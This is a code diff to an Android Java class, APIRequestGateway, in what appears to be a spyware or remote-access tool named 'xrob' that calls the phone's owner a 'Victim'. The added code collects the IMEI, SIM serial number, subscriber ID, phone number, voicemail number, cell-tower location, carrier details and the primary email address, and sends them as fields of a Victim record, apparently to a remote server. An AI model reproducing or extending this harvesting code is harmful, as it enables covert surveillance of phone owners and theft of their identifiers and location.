@@ -5,19 +5,16 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.os.Build;
 import android.support.annotation.NonNull;
-import android.support.annotation.Nullable;
-import android.support.annotation.WorkerThread;
 import android.telephony.CellInfo;
 import android.telephony.CellInfoCdma;
 import android.telephony.CellInfoGsm;
 import android.telephony.CellInfoLte;
 import android.telephony.CellInfoWcdma;
-import android.telephony.CellLocation;
+import android.telephony.NeighboringCellInfo;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 
-import com.theah64.xrob.interfaces.JobListener;
 import com.theah64.xrob.models.Victim;
 
 import org.json.JSONException;
@@ -75,6 +72,9 @@ public class APIRequestGateway {
         }
 
         private static String getCooledValue(String value) {
+            if (value == null || value.isEmpty()) {
+                return "-";
+            }
             return value.replaceAll(HOT_REGEX, "~");
         }
 
@@ -91,13 +91,13 @@ public class APIRequestGateway {
 
     }
 
-    private String getOtherDeviceInfo() {
-
-
+    private String getDeviceInfoDynamic() {
         final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();
 
+        //NOT NEEDED FOR NOW.
+       /*
+       int i = 0;
         if (CommonUtils.isSupport(17)) {
-            int i = 0;
             for (final CellInfo cellInfo : tm.getAllCellInfo()) {
                 i++;
 
@@ -108,21 +108,47 @@ public class APIRequestGateway {
                     deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoCdma) cellInfo).getCellSignalStrength().toString());
                     deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoCdma) cellInfo).getCellIdentity().toString());
                 } else if (cellInfo instanceof CellInfoGsm) {
-                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
-                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
+                    deviceInfoBuilder.put(i + " CellInfoGsm Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoGsm CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
                 } else if (cellInfo instanceof CellInfoWcdma) {
-                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
-                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
+                    deviceInfoBuilder.put(i + " CellInfoWcdma Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoWcdma CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
                 } else if (cellInfo instanceof CellInfoLte) {
-                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
-                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
+                    deviceInfoBuilder.put(i + " CellInfoLte Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoLte CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
                 } else {
                     deviceInfoBuilder.put(i + "CellInfo class", cellInfo.getClass().getName());
                     deviceInfoBuilder.put(i + "CellInfo toString", cellInfo.toString());
                 }
             }
+        } else {
+            for (final NeighboringCellInfo cellInfo : tm.getNeighboringCellInfo()) {
+                i++;
+                deviceInfoBuilder.put(i + " celInfo", cellInfo.toString());
+            }
+        }*/
+
+        deviceInfoBuilder.put("NetworkCountryISO", tm.getNetworkCountryIso())
+                .put("NetworkOperator", tm.getNetworkOperator())
+                .put("NetworkOperatorName", tm.getNetworkOperatorName())
+                .put("NetworkType", getNetworkType(tm.getNetworkType()));
+
+        if (CommonUtils.isSupport(23)) {
+            deviceInfoBuilder.put("PhoneCount", tm.getPhoneCount());
         }
 
+        deviceInfoBuilder.put("PhoneType", getPhoneType(tm.getPhoneType()));
+        deviceInfoBuilder.put("SIMCountryISO", tm.getSimCountryIso());
+        deviceInfoBuilder.put("SIMOperator", tm.getSimOperator());
+        deviceInfoBuilder.put("SIMOperatorName", tm.getSimOperatorName());
+        deviceInfoBuilder.put("SIMSerialNumber", tm.getSimSerialNumber());
+
+        //TODO: can be elaborate later.
+        deviceInfoBuilder.put("SIM State", tm.getSimState());
+
+        deviceInfoBuilder.put("SubscriberID", tm.getSubscriberId());
+        deviceInfoBuilder.put("VoiceMailAlphaTag", tm.getVoiceMailAlphaTag());
+        deviceInfoBuilder.put("VoiceMailNumber", tm.getVoiceMailNumber());
 
         //Collecting cell location
         final GsmCellLocation gcmCellLoc = (GsmCellLocation) tm.getCellLocation();
@@ -130,19 +156,29 @@ public class APIRequestGateway {
                 .put("LAC", gcmCellLoc.getLac())
                 .put("PSC", gcmCellLoc.getPsc());
 
-        //Collecting sim card details
-        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
-                .put("Line1Number", tm.getLine1Number())
-                .put("CellLocation", tm.getCellLocation().toString())
-                .put("SoftwareVersion", tm.getDeviceSoftwareVersion());
 
         if (CommonUtils.isSupport(24)) {
-            deviceInfoBuilder.put("Line1Number", getDateNetworkType(tm.getDataNetworkType()));
+            deviceInfoBuilder.put("DataNetworkType", getNetworkType(tm.getDataNetworkType()));
         }
 
         if (CommonUtils.isSupport(19)) {
             deviceInfoBuilder.put("MMSUAProfileUrl", tm.getMmsUAProfUrl());
+            deviceInfoBuilder.put("MMSUserAgent", tm.getMmsUserAgent());
         }
+
+        //Collecting sim card details
+        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
+                .put("Line1Number", tm.getLine1Number())
+                .put("CellLocation", tm.getCellLocation().toString())
+                .putLastInfo("SoftwareVersion", tm.getDeviceSoftwareVersion());
+
+
+        return deviceInfoBuilder.toString();
+    }
+
+    private String getDeviceInfoStatic() {
+
+        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();
 
         //Collecting device details
         deviceInfoBuilder
@@ -169,7 +205,22 @@ public class APIRequestGateway {
         return deviceInfoBuilder.toString();
     }
 
-    private static String getDateNetworkType(int dataNetworkType) {
+    private static String getPhoneType(int phoneType) {
+        switch (phoneType) {
+            case TelephonyManager.PHONE_TYPE_NONE:
+                return "TYPE_NONE";
+            case TelephonyManager.PHONE_TYPE_GSM:
+                return "TYPE_GSM";
+            case TelephonyManager.PHONE_TYPE_CDMA:
+                return "TYPE_CDMA";
+            case TelephonyManager.PHONE_TYPE_SIP:
+                return "TYPE_SIP";
+            default:
+                return "TYPE_VERY_NONE";
+        }
+    }
+
+    private static String getNetworkType(int dataNetworkType) {
         switch (dataNetworkType) {
             case TelephonyManager.NETWORK_TYPE_GPRS:
                 return "TYPE_GPRS";
@@ -244,7 +295,6 @@ public class APIRequestGateway {
         final String imei = tm.getDeviceId();
         final String deviceName = getDeviceName();
         final String deviceHash = DarKnight.getEncrypted(deviceName + imei);
-        final String otherDeviceInfo = getOtherDeviceInfo();
 
         final String email = profileUtils.getPrimaryEmail();
         final String phone = profileUtils.getPhone();
@@ -258,7 +308,8 @@ public class APIRequestGateway {
                 .addParam(Victim.KEY_IMEI, imei)
                 .addParam(Victim.KEY_DEVICE_NAME, deviceName)
                 .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
-                .addParam(Victim.KEY_OTHER_DEVICE_INFO, otherDeviceInfo)
+                .addParam(Victim.KEY_DEVICE_INFO_STATIC, getDeviceInfoStatic())
+                .addParam(Victim.KEY_DEVICE_INFO_DYNAMIC, getDeviceInfoDynamic())
                 .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
                 .addParamIfNotNull(Victim.KEY_EMAIL, email)
                 .addParamIfNotNull(Victim.KEY_PHONE, phone)
